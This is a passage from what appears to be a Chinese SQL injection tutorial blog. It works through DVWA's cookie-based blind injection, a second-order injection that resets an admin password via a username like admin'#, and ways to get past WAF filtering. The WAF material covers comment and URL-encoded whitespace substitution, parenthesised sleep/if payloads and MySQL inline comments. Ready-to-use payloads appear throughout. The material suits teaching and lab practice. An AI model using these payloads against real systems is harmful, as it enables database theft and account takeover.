&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$getid&lt;/span&gt;  &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; LIMIT 1;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;],  &lt;span style=&#34;color:#e06c75&#34;&gt;$getid&lt;/span&gt; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$num&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_num_rows&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; ); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$num&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; ) &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;sleep&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt; ) );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;header&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span&gt; ] &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; 404 Not Found&amp;#39;&lt;/span&gt; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ((&lt;span style=&#34;color:#e06c75&#34;&gt;is_null&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$___mysqli_res&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_close&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;]))) &lt;span style=&#34;color:#56b6c2&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$___mysqli_res&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie&lt;/p&gt;
&lt;p&gt;在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样&lt;/p&gt;
&lt;p&gt;我们点击链接更换新cookie：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())=4 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;刷新页面&lt;/strong&gt;，页面显示&lt;code&gt;User ID exists in the database.&lt;/code&gt;，说明查询成功了，也就是数据库名称长度为4&lt;/p&gt;
&lt;p&gt;值得注意的是，这段代码里还有这样的一段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; ) &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;sleep&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt; ) );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;f12开发者工具（应用 -&amp;gt; cookie）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701200225693&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;浏览器扩展（比如cookie editor）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701200301860&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;8-二次注入&#34;&gt;#8 二次注入
&lt;/h2&gt;&lt;p&gt;二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据&lt;/p&gt;
&lt;p&gt;我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户注册的php：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username_escaped&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;INSERT INTO users (username, password) VALUES (&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username_escaped&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;, &amp;#39;some_password_hash&amp;#39;)&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开发者使用了&lt;code&gt;addslashes&lt;/code&gt;对输入进行转义，过滤了可能的危险语句&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改密码的php：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$current_user&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$new_password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;new_password&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;UPDATE users SET password = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$new_password&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; WHERE username = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$current_user&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理&lt;/p&gt;
&lt;p&gt;现在我们注册一个账号，用户名叫：&lt;code&gt;admin&#39;#&lt;/code&gt;，假设这个网站管理员账号叫&lt;code&gt;admin&lt;/code&gt;，跟我们输入的名称很像吧&lt;/p&gt;
&lt;p&gt;经过注册程序的检查，这个名称没有任何问题，于是放进了数据库&lt;/p&gt;
&lt;p&gt;接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里&lt;/p&gt;
&lt;p&gt;这时，sql语句就变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;new_password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;因为#的注释，我们竟然直接修改了admin账号的密码！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;好啦，这下我们可以随意登录管理员的账号啦~&lt;/p&gt;
&lt;h1 id=&#34;绕过waf&#34;&gt;绕过WAF
&lt;/h1&gt;&lt;p&gt;为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)&lt;/p&gt;
&lt;p&gt;作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的&lt;/p&gt;
&lt;h2 id=&#34;1-空格过滤绕过&#34;&gt;#1 空格过滤绕过
&lt;/h2&gt;&lt;p&gt;众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,  &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT user, password FROM users WHERE user_id = &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它会直接把用户输入内容中的空格移除，然后再拼接进去&lt;/p&gt;
&lt;p&gt;但是，空格有很多的绕过方式&lt;/p&gt;
&lt;h3 id=&#34;注释绕过&#34;&gt;注释绕过
&lt;/h3&gt;&lt;p&gt;在大多数的数据库（特别是mysql）中，&lt;strong&gt;注释&lt;code&gt;/**/&lt;/code&gt;能够代替空格&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;/**/union/**/select/**/1,database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250628203003878&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到，sql语句能够正常运行&lt;/p&gt;
&lt;h3 id=&#34;url编码绕过&#34;&gt;url编码绕过
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一般来说，我们会使用&lt;code&gt;+&lt;/code&gt;代替空格，因为&lt;code&gt;+&lt;/code&gt;是空格的一种url标准编码形式，如果不行，就要另寻他法了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;符号&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;%20&lt;/td&gt;
          &lt;td&gt;普通空格&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%09&lt;/td&gt;
          &lt;td&gt;TAB 键(水平)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%0a&lt;/td&gt;
          &lt;td&gt;新建一行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%0c&lt;/td&gt;
          &lt;td&gt;新的一页&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%0d&lt;/td&gt;
          &lt;td&gt;return 功能&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%0b&lt;/td&gt;
          &lt;td&gt;TAB 键(垂直)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;%a0&lt;/td&gt;
          &lt;td&gt;空格（和普通空格不一样）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用&lt;/p&gt;
&lt;p&gt;制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
&lt;/h3&gt;&lt;h4 id=&#34;数字型&#34;&gt;数字型
&lt;/h4&gt;&lt;p&gt;mysql数据库有这样一个特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在where id=1后加上=1，变成where id=1=1，意思是查询结果不变&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在where id=1后加上=0，变成where id=1=0，意思是查询结果取反&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结合substring()，我们就能构造出下面的不带有空格注入：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1=(ascii(substring(database(),1,1))=100)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入&lt;/p&gt;
&lt;h4 id=&#34;字符型数字型&#34;&gt;字符型&amp;amp;数字型
&lt;/h4&gt;&lt;p&gt;mysql数据库还有一个特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;任何可以计算出结果的语句，都可以用括号包围起来&lt;/strong&gt;&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上文提到的&lt;code&gt;sleep()&lt;/code&gt;函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;而if()函数的返回值则取决于我们写在if里面的函数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;and(if(length(database())=4,sleep(5),1))#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型&lt;/p&gt;
&lt;p&gt;如果逗号被过滤，一般也要使用括号绕过：&lt;a class=&#34;link&#34; href=&#34;#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7&#34; &gt;逗号绕过——绕过函数参数中的逗号
    
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-内联注释绕过&#34;&gt;#2 内联注释绕过
&lt;/h2&gt;&lt;h3 id=&#34;绕过特定屏蔽词&#34;&gt;绕过特定屏蔽词
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;为了保持和其他数据库的兼容，mysql数据库会执行放在&lt;code&gt;/*!...*/&lt;/code&gt;里面的语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在&lt;code&gt;/*!...*/&lt;/code&gt;里，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union/*!select*/ 1,2 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250629194535907&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们还可以在&lt;code&gt;/*!...*/&lt;/code&gt;里面加上版本号：&lt;code&gt;/*!50001...*/&lt;/code&gt;，表示数据库是5.00.01及以上版本，该语句才会被执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我使用的dvwa的mysql版本是5.5.53，如果使用&lt;code&gt;1&#39; union/*!60001select*/ 1,2 #&lt;/code&gt;，就会报版本错：&lt;/p&gt;
